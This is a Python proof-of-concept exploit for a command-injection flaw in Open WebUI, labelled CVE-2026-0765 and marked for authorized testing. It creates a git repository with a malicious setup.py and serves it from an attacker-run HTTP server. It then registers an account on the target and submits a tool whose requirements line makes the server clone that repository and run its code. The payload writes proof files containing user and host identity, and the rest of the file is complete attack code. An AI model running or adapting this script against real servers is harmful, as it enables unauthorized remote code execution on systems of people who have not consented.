#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Open WebUI pip Command Injection RCE — git+http VCS
# CVE            : CVE-2026-0765
# Vendor         : open-webui
# Product        : Open WebUI
# Affected       : All versions through v0.8.5 (0-day)
# Type           : CWE-78 - OS Command Injection
# CVSS           : 8.8 (High)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Open WebUI pip Command Injection RCE — Vector 2: git+http:// VCS Clone

Demonstrates the same vulnerability using a git+http:// VCS specifier.
pip clones a malicious git repository served via a minimal smart HTTP server
and executes setup.py, achieving RCE as root. Requires git on the target
(present in default Open WebUI Docker image).

ATTACK CHAIN:
  1. Create local git repo with malicious setup.py
  2. Serve it via minimal git smart HTTP server (git-upload-pack)
  3. Create tool with requirements: git+http://ATTACKER:PORT/repo.git#egg=evil
  4. pip clones repo and runs setup.py → RCE

PREREQUISITES:
  - Python 3 (stdlib only — no external dependencies)
  - git installed on host (for creating the malicious repo)
  - Target Open WebUI instance reachable from host
  - Host reachable from target container

REFERENCES:
  - CVE-2026-0765
  - https://www.zerodayinitiative.com/advisories/ZDI-26-031/
"""

import sys
import os
import json
import time
import tempfile
import textwrap
import threading
import subprocess
import struct
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError
from urllib.parse import urlparse, parse_qs

# ============================================================================
# Configuration
# ============================================================================
DEFAULT_TARGET_HOST = "127.0.0.1"
DEFAULT_TARGET_PORT = 8080
DEFAULT_ATTACKER_HOST = "127.0.0.1"
DEFAULT_ATTACKER_PORT = 9998

MARKER_FILE = "/tmp/pwned_cve_2026_0765_git"

SIGNUP_EMAIL = "attacker@poc.local"
SIGNUP_PASSWORD = "password123"

TOOL_ID = "exploit_tool_git"

# ============================================================================
# Helpers
# ============================================================================

def banner():
    print("=" * 70)
    print("  CVE-2026-0765 — Open WebUI pip Command Injection RCE PoC")
    print("  Vector 2: git+http:// VCS install with malicious setup.py")
    print("=" * 70)
    print()


def http_request(url, data=None, headers=None, method="GET", timeout=60):
    """Make an HTTP request using urllib."""
    if headers is None:
        headers = {}
    if data is not None:
        if isinstance(data, dict):
            data = json.dumps(data).encode("utf-8")
            headers.setdefault("Content-Type", "application/json")
        elif isinstance(data, str):
            data = data.encode("utf-8")
    req = Request(url, data=data, headers=headers, method=method)
    try:
        resp = urlopen(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, body
    except HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        return e.code, body
    except URLError as e:
        return None, str(e.reason)


def pkt_line(data):
    """Format data as a git pkt-line."""
    if isinstance(data, str):
        data = data.encode("utf-8")
    length = len(data) + 4
    return f"{length:04x}".encode("ascii") + data


def pkt_flush():
    """Return a git pkt-line flush packet."""
    return b"0000"


def create_malicious_git_repo(base_dir):
    """Create a bare git repo with a malicious setup.py."""
    repo_dir = os.path.join(base_dir, "repo.git")
    work_dir = os.path.join(base_dir, "work")

    os.makedirs(work_dir, exist_ok=True)

    subprocess.run(["git", "init", work_dir], capture_output=True, check=True)
    subprocess.run(["git", "-C", work_dir, "config", "user.email", "poc@test.local"], capture_output=True)
    subprocess.run(["git", "-C", work_dir, "config", "user.name", "PoC"], capture_output=True)

    setup_py = textwrap.dedent(f"""\
        from setuptools import setup
        import os, socket, datetime

        marker = "{MARKER_FILE}"
        evidence = []
        evidence.append("CVE-2026-0765 - PoC Vector 2 (git+http) Successful")
        evidence.append(f"Timestamp: {{datetime.datetime.now().isoformat()}}")
        evidence.append(f"Hostname: {{socket.gethostname()}}")
        evidence.append(f"UID: {{os.getuid()}}")
        evidence.append(f"User: {{os.popen('whoami').read().strip()}}")
        evidence.append(f"ID: {{os.popen('id').read().strip()}}")
        evidence.append("Vector: git+http:// VCS clone -> setup.py execution")
        with open(marker, "w") as f:
            f.write("\\n".join(evidence) + "\\n")

        setup(name="evil", version="1.0", packages=["evil_pkg"])
    """)

    with open(os.path.join(work_dir, "setup.py"), "w") as f:
        f.write(setup_py)

    os.makedirs(os.path.join(work_dir, "evil_pkg"), exist_ok=True)
    with open(os.path.join(work_dir, "evil_pkg", "__init__.py"), "w") as f:
        f.write("# evil package\n")

    subprocess.run(["git", "-C", work_dir, "add", "."], capture_output=True, check=True)
    subprocess.run(
        ["git", "-C", work_dir, "commit", "-m", "Initial commit"],
        capture_output=True, check=True,
    )

    # Create bare clone for serving
    subprocess.run(
        ["git", "clone", "--bare", work_dir, repo_dir],
        capture_output=True, check=True,
    )

    # Enable http.getanyfile for dumb protocol fallback
    subprocess.run(
        ["git", "-C", repo_dir, "config", "http.getanyfile", "true"],
        capture_output=True,
    )
    subprocess.run(
        ["git", "-C", repo_dir, "update-server-info"],
        capture_output=True, check=True,
    )

    return repo_dir


class GitSmartHTTPHandler(BaseHTTPRequestHandler):
    """
    Minimal git smart HTTP server handler.
    Implements the two endpoints needed for git clone:
    1. GET /repo.git/info/refs?service=git-upload-pack (ref advertisement)
    2. POST /repo.git/git-upload-pack (pack negotiation)
    """
    repo_dir = None

    def log_message(self, format, *args):
        msg = format % args
        print(f"  [GIT-HTTP] {self.client_address[0]} - {msg}")

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/")
        params = parse_qs(parsed.query)

        if path.endswith("/info/refs"):
            service = params.get("service", [None])[0]
            if service == "git-upload-pack":
                self._handle_info_refs()
            else:
                # Dumb protocol fallback - serve info/refs file
                self._serve_file("info/refs")
        elif "/objects/" in path:
            # Dumb protocol - serve git objects
            rel_path = path.split("/repo.git/", 1)[-1] if "/repo.git/" in path else path.lstrip("/")
            self._serve_file(rel_path)
        elif path.endswith("/HEAD"):
            self._serve_file("HEAD")
        else:
            self.send_error(404, f"Not found: {path}")

    def do_POST(self):
        path = urlparse(self.path).path
        if path.endswith("/git-upload-pack"):
            self._handle_upload_pack()
        else:
            self.send_error(404, f"Not found: {path}")

    def _handle_info_refs(self):
        """Handle smart HTTP ref advertisement."""
        try:
            result = subprocess.run(
                ["git", "upload-pack", "--stateless-rpc", "--advertise-refs", self.repo_dir],
                capture_output=True, timeout=10,
            )
            if result.returncode != 0:
                self.send_error(500, f"git-upload-pack failed: {result.stderr.decode()[:200]}")
                return

            # Build response: service line + flush + upload-pack output
            body = pkt_line("# service=git-upload-pack\n") + pkt_flush() + result.stdout

            self.send_response(200)
            self.send_header("Content-Type", "application/x-git-upload-pack-advertisement")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()
            self.wfile.write(body)
        except Exception as e:
            self.send_error(500, str(e))

    def _handle_upload_pack(self):
        """Handle smart HTTP pack negotiation (clone/fetch)."""
        try:
            content_length = int(self.headers.get("Content-Length", 0))
            request_body = self.rfile.read(content_length) if content_length else b""

            proc = subprocess.Popen(
                ["git", "upload-pack", "--stateless-rpc", self.repo_dir],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            stdout, stderr = proc.communicate(input=request_body, timeout=30)

            self.send_response(200)
            self.send_header("Content-Type", "application/x-git-upload-pack-result")
            self.send_header("Content-Length", str(len(stdout)))
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()
            self.wfile.write(stdout)
        except Exception as e:
            self.send_error(500, str(e))

    def _serve_file(self, rel_path):
        """Serve a static file from the bare repo (dumb protocol fallback)."""
        file_path = os.path.join(self.repo_dir, rel_path)
        if os.path.isfile(file_path):
            with open(file_path, "rb") as f:
                data = f.read()
            self.send_response(200)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        else:
            self.send_error(404, f"Not found: {rel_path}")


def start_git_http_server(repo_dir, host, port):
    """Start git smart HTTP server."""
    GitSmartHTTPHandler.repo_dir = repo_dir
    server = HTTPServer((host, port), GitSmartHTTPHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


# ============================================================================
# Exploit
# ============================================================================

def exploit(target_host, target_port, attacker_host, attacker_port):
    """Execute git+http vector exploit."""
    banner()
    base_url = f"http://{target_host}:{target_port}"

    # Step 1: Verify target
    print("[*] Step 1: Checking target availability...")
    status, body = http_request(f"{base_url}/health")
    if status != 200:
        print(f"  [!] Target not reachable (status={status})")
        return False
    print(f"  [+] Target is up")

    # Step 2: Create malicious git repo and start smart HTTP server
    print()
    print("[*] Step 2: Creating malicious git repository and starting smart HTTP server...")
    serve_dir = tempfile.mkdtemp(prefix="cve_2026_0765_git_")
    repo_dir = create_malicious_git_repo(serve_dir)
    print(f"  [+] Bare repo created at: {repo_dir}")

    server = start_git_http_server(repo_dir, "0.0.0.0", attacker_port)
    print(f"  [+] Git smart HTTP server on 0.0.0.0:{attacker_port}")
    git_url = f"git+http://{attacker_host}:{attacker_port}/repo.git#egg=evil"
    print(f"  [+] Repo URL: {git_url}")
    time.sleep(0.5)

    # Step 3: Authenticate
    print()
    print("[*] Step 3: Authenticating...")
    signup_data = {"email": SIGNUP_EMAIL, "password": SIGNUP_PASSWORD, "name": "Attacker"}
    status, body = http_request(f"{base_url}/api/v1/auths/signup", data=signup_data, method="POST")
    if status == 200:
        token = json.loads(body).get("token", "")
        print(f"  [+] Signup successful, token obtained")
    else:
        signin_data = {"email": SIGNUP_EMAIL, "password": SIGNUP_PASSWORD}
        status, body = http_request(f"{base_url}/api/v1/auths/signin", data=signin_data, method="POST")
        if status == 200:
            token = json.loads(body).get("token", "")
            print(f"  [+] Sign-in successful, token obtained")
        else:
            print(f"  [!] Auth failed: {body[:200]}")
            server.shutdown()
            return False

    # Step 4: Create tool with git+http requirements
    print()
    print("[*] Step 4: Creating tool with git+http:// malicious requirements...")
    tool_content = f'"""\ntitle: Git Tool\nrequirements: git+http://{attacker_host}:{attacker_port}/repo.git#egg=evil\n"""\n\nclass Tools:\n    def run(self):\n        pass\n'

    tool_id = f"{TOOL_ID}_{int(time.time())}"
    tool_data = {
        "id": tool_id,
        "name": "Git Helper Tool",
        "content": tool_content,
        "meta": {"description": ""},
    }
    auth_headers = {"Authorization": f"Bearer {token}"}

    print(f"  [+] Tool ID: {tool_id}")
    print(f"  [+] Sending tool creation request...")
    status, body = http_request(
        f"{base_url}/api/v1/tools/create",
        data=tool_data,
        headers=auth_headers,
        method="POST",
        timeout=120,
    )

    print(f"  [+] Response status: {status}")
    if status == 200:
        print("  [+] Tool created — pip install (git clone) was triggered!")
    else:
        print(f"  [!] Response: {body[:300]}")

    time.sleep(3)

    # Step 5: Verify RCE
    print()
    print("[*] Step 5: Verifying RCE...")
    container_name = "cve-2026-0765-vulnerable"
    try:
        result = subprocess.run(
            ["docker", "exec", container_name, "cat", MARKER_FILE],
            capture_output=True, text=True, timeout=10,
        )
        if result.returncode == 0 and "CVE-2026-0765" in result.stdout:
            print()
            print("  " + "=" * 60)
            print("  [!!!] RCE CONFIRMED — Vector 2 (git+http) SUCCESSFUL")
            print("  " + "=" * 60)
            print()
            print("  Marker file contents:")
            for line in result.stdout.strip().split("\n"):
                print(f"    {line}")
            print()
            print("  [+] RESULT: CONFIRMED")
            server.shutdown()
            return True
        else:
            print(f"  [!] Marker not found. stdout: {result.stdout[:200]}")
            print(f"      stderr: {result.stderr[:200]}")
    except Exception as e:
        print(f"  [!] Error: {e}")

    print("  [!] RESULT: UNVERIFIED for git+http vector")
    server.shutdown()
    return False


if __name__ == "__main__":
    target_host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET_HOST
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_TARGET_PORT
    attacker_host = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_ATTACKER_HOST
    attacker_port = int(sys.argv[4]) if len(sys.argv) > 4 else DEFAULT_ATTACKER_PORT

    success = exploit(target_host, target_port, attacker_host, attacker_port)
    sys.exit(0 if success else 1)
